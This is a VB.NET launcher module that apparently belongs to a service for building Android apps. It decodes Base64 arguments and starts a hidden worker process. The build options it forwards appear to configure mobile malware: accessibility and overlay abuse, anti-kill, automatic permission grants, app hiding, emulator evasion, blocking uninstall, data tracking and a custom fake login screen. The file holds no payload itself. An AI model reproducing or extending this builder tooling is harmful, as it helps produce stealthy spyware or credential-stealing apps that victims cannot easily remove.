Imports System.Text
Imports Microsoft.Win32

Module Starter

    Private userid As String
    Private appid As String
    Private ClientName As String = Nothing
    Private UserHost As String = Nothing

    Private use_access As String = Nothing
    Private use_draw As String = Nothing
    Private use_antkill As String = Nothing
    Private use_atoprims As String = Nothing
    Private notifytitle As String = Nothing
    Private notifymsg As String = Nothing

    Private allprims As String = Nothing
    Private Buildtype As String = Nothing


    Private appname As String = Nothing
    Private appversion As String = Nothing
    Private appicopath As String = Nothing
    Private appurl As String = Nothing
    Private logintitle As String = Nothing
    Private logindis As String = Nothing
    Private loginbtn As String = Nothing
    Private lngshort As String = Nothing
    Private hiddenapp As String = Nothing
    Private noemulator As String = Nothing
    Private miuiautostart As String = Nothing
    Private autorunback As String = Nothing
    Private installtype As String = Nothing
    Private hidetype As String = Nothing
    Private nosleep As String = Nothing
    Private caplock As String = Nothing
    Private trakingdata As String = Nothing
    Private allconfig As String = Nothing
    Private nodelete As String = Nothing



    Private Email As String = Nothing
    Private MainActivity As String = Nothing
    Private appdir As String = Nothing

    Private Workerid As String



    'enum('onbuild', 'failed', 'finished')


    Sub Main()


        Try

            Threading.Thread.Sleep(500)

            Dim args() As String = Split(Command(), " ")
            If args Is Nothing Or args.Length = 0 Then
                Console.WriteLine("Invalid Parameter Builder.")
                Environment.Exit(0)
            End If

            Dim com As String = args(0).Trim("""")


            Try
                appid = Base64Decode(args(1).Trim(""""))
                userid = Base64Decode(args(2).Trim(""""))
                ClientName = Base64Decode(args(3).Trim(""""))
                Email = Base64Decode(args(4).Trim(""""))
                MainActivity = Base64Decode(args(5).Trim(""""))
                appdir = Base64Decode(args(6).Trim(""""))
                UserHost = Base64Decode(args(7).Trim(""""))

                use_access = Base64Decode(args(8).Trim(""""))
                use_draw = Base64Decode(args(9).Trim(""""))
                use_antkill = Base64Decode(args(10).Trim(""""))
                use_atoprims = Base64Decode(args(11).Trim(""""))
                notifytitle = Base64Decode(args(12).Trim(""""))
                notifymsg = Base64Decode(args(13).Trim(""""))

                If String.IsNullOrWhiteSpace(notifytitle) Or String.IsNullOrEmpty(notifytitle) Then
                    notifytitle = "  "
                End If

                If String.IsNullOrWhiteSpace(notifymsg) Or String.IsNullOrEmpty(notifymsg) Then
                    notifymsg = "  "
                End If

                allprims = Base64Decode(args(14).Trim(""""))

                Buildtype = Base64Decode(args(15).Trim(""""))
                appname = Base64Decode(args(16).Trim(""""))
                appversion = Base64Decode(args(17).Trim(""""))
                appicopath = Base64Decode(args(18).Trim(""""))
                appurl = Base64Decode(args(19).Trim(""""))
                logintitle = Base64Decode(args(20).Trim(""""))
                logindis = Base64Decode(args(21).Trim(""""))
                loginbtn = Base64Decode(args(22).Trim(""""))
                lngshort = Base64Decode(args(23).Trim(""""))

                hiddenapp = Base64Decode(args(24).Trim(""""))
                noemulator = Base64Decode(args(25).Trim(""""))
                miuiautostart = Base64Decode(args(26).Trim(""""))
                autorunback = Base64Decode(args(27).Trim(""""))
                installtype = Base64Decode(args(28).Trim(""""))
                hidetype = Base64Decode(args(29).Trim(""""))
                nosleep = Base64Decode(args(30).Trim(""""))
                caplock = Base64Decode(args(31).Trim(""""))
                trakingdata = Base64Decode(args(32).Trim(""""))
                allconfig = Base64Decode(args(33).Trim(""""))
                nodelete = Base64Decode(args(34).Trim(""""))
                'If Buildtype = "C" Then
                '    appname = Base64Decode(args(16).Trim(""""))
                '    appversion = Base64Decode(args(17).Trim(""""))
                '    appicopath = Base64Decode(args(18).Trim(""""))
                '    appurl = Base64Decode(args(19).Trim(""""))
                '    logintitle = Base64Decode(args(20).Trim(""""))
                '    logindis = Base64Decode(args(21).Trim(""""))
                '    loginbtn = Base64Decode(args(22).Trim(""""))
                '    lngshort = Base64Decode(args(23).Trim(""""))

                '    hiddenapp = Base64Decode(args(24).Trim(""""))
                '    noemulator = Base64Decode(args(25).Trim(""""))
                '    miuiautostart = Base64Decode(args(26).Trim(""""))
                '    autorunback = Base64Decode(args(27).Trim(""""))
                '    installtype = Base64Decode(args(28).Trim(""""))
                '    hidetype = Base64Decode(args(29).Trim(""""))
                '    nosleep = Base64Decode(args(30).Trim(""""))

                'Else
                '    appname = "_"
                '    appversion = "_"
                '    appicopath = "_"
                '    appurl = "_"
                '    logintitle = "_"
                '    logindis = "_"
                '    loginbtn = "_"
                '    hiddenapp = "_"
                '    noemulator = "_"
                '    miuiautostart = "_"
                '    autorunback = "_"
                '    installtype = "_"
                '    hidetype = "_"
                '    nosleep = "_"
                '    lngshort = Base64Decode(args(16).Trim(""""))
                'End If

            Catch ex As Exception

                Console.WriteLine("> Error: " + "Something went wrong")
                Mylogger.LogError(userid, "inialize values error:", ex.Message)
                Environment.Exit(0)
            End Try


            Workerid = CovertToMD5(userid + "_" + appid)

            Select Case com
                Case "lunch"


                    If Busy(Workerid) Then
                        Console.WriteLine("This app is building right now , please wait.")
                        Environment.Exit(0)
                    End If

                    Dim exePath As String = "SolrWorker.exe"


                    Dim encodedArguments As String = ToBase64(Workerid) + " " +
                                                     ToBase64(appid) + " " +
                                                     ToBase64(userid) + " " +
                                                     ToBase64(ClientName) + " " +
                                                     ToBase64(Email) + " " +
                                                     ToBase64(MainActivity) + " " +
                                                     ToBase64(appdir) + " " +
                                                     ToBase64(UserHost) + " " +
                                                     ToBase64(use_access) + " " +
                                                     ToBase64(use_draw) + " " +
                                                     ToBase64(use_antkill) + " " +
                                                     ToBase64(use_atoprims) + " " +
                                                     ToBase64(notifytitle) + " " +
                                                     ToBase64(notifymsg) + " " +
                                                     ToBase64(allprims) + " " +
                                                     ToBase64(Buildtype) + " " +
                                                     ToBase64(appname) + " " +
                                                     ToBase64(appversion) + " " +
                                                     ToBase64(appicopath) + " " +
                                                     ToBase64(appurl) + " " +
                                                     ToBase64(logintitle) + " " +
                                                     ToBase64(logindis) + " " +
                                                     ToBase64(loginbtn) + " " +
                                                     ToBase64(lngshort) + " " +
                                                     ToBase64(hiddenapp) + " " +
                                                     ToBase64(noemulator) + " " +
                                                     ToBase64(miuiautostart) + " " +
                                                     ToBase64(autorunback) + " " +
                                                     ToBase64(installtype) + " " +
                                                     ToBase64(hidetype) + " " +
                                                     ToBase64(nosleep) + " " +
                                                     ToBase64(caplock) + " " +
                                                     ToBase64(trakingdata) + " " +
                                                     ToBase64(allconfig) + " " +
                                                     ToBase64(nodelete)






                    Dim startInfo As New ProcessStartInfo()
                    startInfo.FileName = exePath
                    startInfo.Arguments = encodedArguments
                    startInfo.CreateNoWindow = True

                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    startInfo.UseShellExecute = True


                    Process.Start(startInfo)

                    Console.WriteLine("Your app is building now.")

                    Exit Select
                Case Else
                    Console.WriteLine("Invalid Command.")
                    Exit Select
            End Select

            Environment.Exit(0)

        Catch ex As Exception
            Console.WriteLine("> Starter: " + ex.Message)
            Mylogger.LogError(userid, "Main starter", ex.Message)
        End Try
    End Sub
    Function ToBase64(input As String) As String
        Dim bytes As Byte() = Encoding.UTF8.GetBytes(input)
        Return Convert.ToBase64String(bytes)
    End Function
    Function Busy(ByVal userid As String) As Boolean
        Try
            Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\AppWorkers")
            If key IsNot Nothing Then
                Dim value As Object = key.GetValue(userid)
                If value IsNot Nothing Then
                    Dim pid As Integer
                    If Integer.TryParse(value.ToString(), pid) Then
                        Dim process As Process = Process.GetProcessById(pid)
                        If process IsNot Nothing AndAlso Not process.HasExited Then
                            Return True
                        End If
                    End If
                End If
            End If
        Catch ex As Exception

        End Try
        Return False
    End Function

    Function CovertToMD5(retVal As String) As String
        Using MD5 = System.Security.Cryptography.MD5.Create()
            Return BitConverter.ToString(MD5.ComputeHash(Encoding.Default.GetBytes(retVal))).Replace("-", String.Empty)
        End Using
    End Function


    Public Function Base64Decode(encodedString As String) As String
        Dim decodedBytes As Byte() = Convert.FromBase64String(encodedString)
        Return System.Text.Encoding.UTF8.GetString(decodedBytes)
    End Function




End Module
